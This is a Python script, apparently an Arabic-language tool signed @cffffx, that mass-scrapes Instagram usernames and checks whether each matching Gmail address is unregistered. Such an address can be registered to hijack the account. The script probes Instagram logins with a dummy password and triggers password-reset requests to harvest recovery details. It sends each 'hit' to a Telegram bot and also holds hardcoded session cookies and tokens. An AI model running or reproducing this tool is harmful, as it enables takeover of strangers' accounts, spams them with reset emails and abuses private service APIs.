import requests,time
import random
import json
import uuid
import pyfiglet
import os
import threading
from faker import Faker
#------------------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
y = '\033[1;35m'#وردي
f = '\033[2;35m'#بنفسجي
z = '\033[3;33m'#اصفر طوخ
G = '\033[2;36m'
E = '\033[1;31m'
V = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
O = '\x1b[38;5;208m' #برتقالي
BL = '\x1b[38;5;21m' #ازاق طوخ
YU = '\x1b[38;5;200m' #وردي طوخ
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
#--------------------
a=0
e=0
b=0
n=0
good1=0
good2=0
bad1=0
bad2=0
session = input(f' {BPurple}ENTER SESSION :{BWhite} ')

token = input(f' {O}ENTER TOKEN :{BCyan}')

ID = input(f'{U} ENTER ID : {BRed}')

def lo(uss):
   global good1,good2,bad1,bad2
   email=uss
   url='https://i.instagram.com/api/v1/accounts/login/'
   headers={
    'Content-Length': '278',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Host': 'i.instagram.com',
    'Connection': 'Keep-Alive',
    'User-Agent': 'Instagram 113.0.0.39.122 Android (28/9; 191dpi; 1024x576; unknown; unknown; unknown; intel; ar_EG)',
    'Accept-Language': 'en-US, en-US',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': 'AQ==',
    'Accept-Encoding': 'gzip',
    }
   da={
    'username':email,
    'password':'3qrrr4qr',
    'device_id':str(uuid.uuid4())
    }
   req=requests.post(url,headers=headers,data=da).text
   if '"The password you entered is incorrect. Please try again."' in req:
      good1+=1
      os.system('cls' if os.name=='nt'else'clear')
      
      print(f'''
{O}GOOD INSTA :{BL}{good1}
{F}GOOD GMAIL :{F}{good2}
{BL}BAD GMAIL :{Z}{bad1}
{YU}BAD INSTA :{Z}{bad2}
{O}- {U} Email - [ {email} ] -  
{BCyan}: Tool programmer  {U}@cffffx

''')
      url = 'https://android.clients.google.com/setup/checkavail'
      h = {
'Content-Length':'98',
'Content-Type':'text/plain; charset=UTF-8',
'Host':'android.clients.google.com',
'Connection':'Keep-Alive',
'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
}
      d = json.dumps({
'username':email,
'version':'3',
'firstName':'AbaLahb',
'lastName':'AbuJahl'
})
      res = requests.post(url,headers=h,data=d,timeout=0.4)
      if res.json()['status'] == 'SUCCESS':
          good2+=1
          os.system('cls' if os.name=='nt'else'clear')
          print(f'''
{O}GOOD INSTA :{BL}{good1}
{F}GOOD GMAIL :{F}{good2}
{BL}BAD GMAIL :{Z}{bad1}
{YU}BAD INSTA :{Z}{bad2}
{O}- {U} Email - [ {email} ] -  
{BCyan}: Tool programmer  {U}@cffffx

''')
          user=email.split('@gmail.com')[0]
          url=f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}'
          headers={
'Accept':'*/*',
'Accept-Encoding':'gzip, deflate, br',
'Accept-Language':'ar,en-US;q=0.9,en;q=0.8',
'Cookie':'csrftoken=IchbyeD2EMfxlXtEidhVb473sX2nACJi; mid=ZMexfQALAAGt5vpo-vofNvm6berX; ig_did=60ACBB13-D599-407C-82A8-89F0ACCD5C26; ig_nrcb=1; datr=x83MZBLzuED-nRpgcIfvN5cA',
'Referer':'https://www.instagram.com/gzik/',
'Sec-Ch-Prefers-Color-Scheme':'light',
'Sec-Ch-Ua':'"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
'Sec-Ch-Ua-Full-Version-List':'"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.170", "Chromium";v="115.0.5790.170"',
'Sec-Ch-Ua-Mobile':'?0',
'Sec-Ch-Ua-Platform':'"Windows"',
'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
'Sec-Fetch-Dest':'empty',
'Sec-Fetch-Mode':'cors',
'Sec-Fetch-Site':'same-origin',
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
'Viewport-Width':'454',
'X-Asbd-Id':'129477',
'X-Csrftoken':'IchbyeD2EMfxlXtEidhVb473sX2nACJi',
'X-Ig-App-Id':'936619743392459',
'X-Ig-Www-Claim':'0',
'X-Requested-With':'XMLHttpRequest',
}
          data={
'username': user,
}
          try:
              req = requests.get(url,headers=headers,data=data).json()
              name = req['data']['user']['full_name']
              id = req['data']['user']['id']
              fols= req['data']['user']['edge_followed_by']['count']
              folg = req['data']['user']['edge_follow']['count']
              z=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()
              date=z['date']
              head= {
			"accept": "*/*",
		"accept-language": "ar-AE,ar-IQ;q =0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6",
		"sec-ch-prefers-color-scheme": "light",
		"sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
		"sec-ch-ua-full-version-list": "\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5615.137\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"viewport-width": "412",
		"x-asbd-id": "198387",
		"x-csrftoken": "nVW5MosXQoEr1Rv1Nc4qraggjTdU5pss",
		"x-ig-app-id": "1217981644879628",
		"x-ig-www-claim": "hmac.AR2QM86Qe5fITwAGguadrM-4LVWQ1OQc5RTpaUp_PHZQAkfb",
		"x-requested-with": "XMLHttpRequest"
		}
              data = {
			'ig_sig_key_version': '4',
			"user_id":f'{id}'
		}
              hr = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=head, data=data).json()
              o=hr['obfuscated_email']
              ff=f"""
🔥 صوفي صادلك متاح انستا 🔥
«----------------صوفي--------------» 
اليوزر 🥴 : {user}
  ايدي✍️  : {id}
  اسم🖍  : {name}
  الايميل📧 : {user}@gmail.com
  المتابعين👨‍👩‍👦 : {fols}
  اليتابعهم👨‍👩‍👦‍👦 : {folg}
  الانشاء💳 : {date}
الريست ✅ : {o}
رابط الحساب 💫 :https://www.instagram.com/{user}
تلكرام : @cffffx
"""	
              
              print(ff)
              requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(ff))
           
         
              with open('hit.txt','a')as zaid:
              	zaid.write(f'{ff}\n')
          except:
              print(Z+f' Error UserName : {user}')
      else:
          bad1+=1
          os.system(Z+'cls' if os.name=='nt'else'clear')
          print(f'''
{O}GOOD INSTA :{BL}{good1}
{F}GOOD GMAIL :{F}{good2}
{BL}BAD GMAIL :{Z}{bad1}
{YU}BAD INSTA :{Z}{bad2}
{O}- {U} Email - [ {email} ] -  
{BCyan}: Tool programmer  {U}@cffffx

''')
   else:
      bad2+=1
      os.system('cls' if os.name=='nt'else'clear')
      print(f'''
{O}GOOD INSTA :{BL}{good1}
{F}GOOD GMAIL :{F}{good2}
{BL}BAD GMAIL :{Z}{bad1}
{YU}BAD INSTA :{Z}{bad2}
{O}- {U} Email - [ {email} ] -  
{BCyan}: Tool programmer  {U}@cffffx

''')
      

def ser():
    faker = Faker('hu_HU') 
    while True:
        #text='qwertyuiopasdfghjklzxcvbnm1234567890'
        #numb='56789'
        #user1=int("".join(random.choice(numb)for i in range(1)))
        #user=str("".join(random.choice(text)for i in range(user1)))
        fk = faker.user_name()
        url=f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&include_reel=true&query={fk}&rank_token=0.932987333502215&search_surface=web_top_search'
        head={
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'ar,en-US;q=0.9,en;q=0.8',
        'Cookie':f'mid=ZLLIKQABAAHB2H38LBwmsFUQTJWW; ig_did=239A3749-E114-4F28-8961-8C68DD329557; ig_nrcb=1; datr=H8iyZAHhWJvK4VI-DVzBaRbm; fbm_124024574287414=base_domain=.instagram.com; dpr=2.1988937854766846; csrftoken=1NVrqmUMKMFL3gW86OzZHa3VjfL1bAzG; ds_user_id=200702755; sessionid={session}; shbid="16689\054200702755\0541725513829:01f7240e310e3a0f7ea65f71727b7e812e392e9d2e2c53a0d46f0d4991528edc179253fc"; shbts="1693977829\054200702755\0541725513829:01f7b2e970d4f5c80050e2ae9bf4f4fed5405bd8ceb5756ab94c4a593d44c059342dd538"; rur="CLN\054200702755\0541725513847:01f7422ed314fd644d87d8536424af38312ebb80a97bbd2cccf42eed1ead608d03a483e2"5754842254''',
        'Dpr':'1',
        'Referer':'https://www.instagram.com/gzik/',
        'Sec-Ch-Prefers-Color-Scheme':'light',
        'Sec-Ch-Ua':'"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'Sec-Ch-Ua-Full-Version-List':'"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.171", "Chromium";v="115.0.5790.171"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Viewport-Width':'726',
        'X-Asbd-Id':'129477',
        'X-Csrftoken':'QxmmIU4D5tF5UfBOnwFBR3kguyNuSbcY',
        'X-Ig-App-Id':'936619743392459',
        'X-Ig-Www-Claim':'0',
        'X-Requested-With':'XMLHttpRequest',
        }
        respoins=requests.get(url, headers=head).json()
        c=0
        try:
            while True:
                c+=1
                uss=respoins['users'][c]['user']['username']+'@gmail.com'
                lo(uss)
        except:
            ser()
zi = threading.Thread(target=ser,args=())
zi.start()
prox_list = []
for i in range(4):
                      t = threading.Thread(target=ser)
                      t.start()
                      prox_list.append(t)
                      time.sleep(0.01)
